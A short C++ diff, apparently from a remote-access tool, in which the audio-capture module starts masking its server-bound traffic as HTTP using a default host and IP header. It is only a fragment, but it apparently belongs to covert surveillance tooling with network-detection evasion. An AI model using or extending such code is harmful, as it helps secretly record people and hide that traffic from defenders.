@@ -25,7 +25,8 @@ CAudioManager::CAudioManager(IOCPClient* ClientObject, int n, void* user):CManag
 	}
 
 	BYTE	bToken = TOKEN_AUDIO_START;
-	m_ClientObject->Send2Server((char*)&bToken, 1);
+	HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
+	m_ClientObject->Send2Server((char*)&bToken, 1, &mask);
 
 	WaitForDialogOpen();    //等待对话框打开
 	szPacket = NULL;
